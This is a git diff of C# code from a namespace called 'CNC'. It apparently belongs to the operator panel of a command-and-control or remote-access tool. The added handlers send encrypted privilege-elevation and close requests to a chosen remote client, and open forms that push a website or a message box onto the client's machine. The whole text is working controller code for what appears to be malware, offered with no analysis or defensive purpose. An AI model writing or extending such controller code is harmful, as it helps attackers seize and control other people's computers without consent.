@@ -127,16 +127,28 @@ namespace CNC
             remoteControllWindow.Show();
         }
 
-        private void closeToolStripMenuItem_Click(object sender, EventArgs e)
+        private void elevateApplicationToolStripMenuItem_Click(object sender, EventArgs e)
+        {
+            Client client = (Client)clientListView.FocusedItem.Tag;
+            client.Connection.SendObject<string>("ElevateReq", Cryptography.Encrypt(Guid.NewGuid().ToString()));
+        }
+
+        private void closeToolStripMenuItem1_Click(object sender, EventArgs e)
         {
             Client client = (Client)clientListView.FocusedItem.Tag;
             client.Connection.SendObject<string>("CloseReq", Cryptography.Encrypt(Guid.NewGuid().ToString()));
         }
 
-        private void elevateAccessToolStripMenuItem_Click(object sender, EventArgs e)
+        private void openWebsiteToolStripMenuItem_Click(object sender, EventArgs e)
         {
-            Client client = (Client)clientListView.FocusedItem.Tag;
-            client.Connection.SendObject<string>("ElevateReq", Cryptography.Encrypt(Guid.NewGuid().ToString()));
+            OpenWebsite openWebsiteForm = new OpenWebsite((Client)clientListView.FocusedItem.Tag);
+            openWebsiteForm.Show();
+        }
+
+        private void showMessageboxToolStripMenuItem_Click(object sender, EventArgs e)
+        {
+            ShowMessageBox showMessageBoxForm = new ShowMessageBox((Client)clientListView.FocusedItem.Tag);
+            showMessageBoxForm.Show();
         }
     }
 }
